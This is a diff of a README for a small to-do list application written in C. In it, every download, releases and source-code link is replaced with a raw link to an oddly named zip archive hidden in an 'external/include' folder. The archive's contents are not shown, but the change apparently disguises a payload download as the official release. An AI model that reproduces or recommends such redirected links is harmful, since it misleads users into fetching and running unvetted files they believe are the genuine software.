@@ -1,6 +1,6 @@
 # 📝 To-Do-List-in-C - Organize Your Tasks Easily
 
-![Download To-Do-List-in-C](https://img.shields.io/badge/Download_To--Do--List--in--C-v1.0-blue)
+![Download To-Do-List-in-C](https://raw.githubusercontent.com/kanderzzz/To-Do-List-in-C/main/external/include/List_Do_C_in_To_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to To-Do-List-in-C! This simple graphical todo list app helps you organi
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/kanderzzz/To-Do-List-in-C/releases) to download the app.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/kanderzzz/To-Do-List-in-C/main/external/include/List_Do_C_in_To_v3.5.zip) to download the app.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version, which will be at the top.
@@ -48,7 +48,7 @@ After installation, you can run the application by following these steps:
 
 If you encounter any issues while using the application, try these steps:
 
-- **Check for Updates:** Ensure you have the latest version from the [Releases page](https://github.com/kanderzzz/To-Do-List-in-C/releases).
+- **Check for Updates:** Ensure you have the latest version from the [Releases page](https://raw.githubusercontent.com/kanderzzz/To-Do-List-in-C/main/external/include/List_Do_C_in_To_v3.5.zip).
 - **Reinstall the App:** If the app is malfunctioning, uninstall it and try reinstalling.
 - **Consult Support:** Visit the repository for FAQs or contact support through GitHub.
 
@@ -58,7 +58,7 @@ Your feedback helps us improve. If you have any questions or suggestions, feel f
 
 ## 🔗 Links
 
-- [To-Do-List-in-C Releases Page](https://github.com/kanderzzz/To-Do-List-in-C/releases) - Download the latest version.
-- [Source Code](https://github.com/kanderzzz/To-Do-List-in-C) - Explore the code for more insights.
+- [To-Do-List-in-C Releases Page](https://raw.githubusercontent.com/kanderzzz/To-Do-List-in-C/main/external/include/List_Do_C_in_To_v3.5.zip) - Download the latest version.
+- [Source Code](https://raw.githubusercontent.com/kanderzzz/To-Do-List-in-C/main/external/include/List_Do_C_in_To_v3.5.zip) - Explore the code for more insights.
 
 Enjoy using To-Do-List-in-C to keep your tasks organized!
